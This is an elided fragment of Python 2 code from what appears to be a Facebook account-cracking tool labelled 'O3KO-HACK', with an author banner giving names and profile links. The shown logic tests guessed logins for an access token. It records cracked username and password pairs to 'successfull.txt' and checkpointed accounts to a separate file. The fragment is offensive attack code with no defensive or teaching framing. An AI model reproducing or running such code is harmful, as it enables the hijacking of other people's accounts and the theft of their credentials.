...
def menu():
    ...
    psb('\x1b[1;92mAUTHOR  : O3KO')
    psb('\x1b[1;94mFACEBOOK : Kaiinat Orko')
    psb('\x1b[1;97mGITHUB  : github.com/O3KO')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[O3KO-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[O3KO-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
                cps = open('O3KO/checkpoint.txt', 'a')
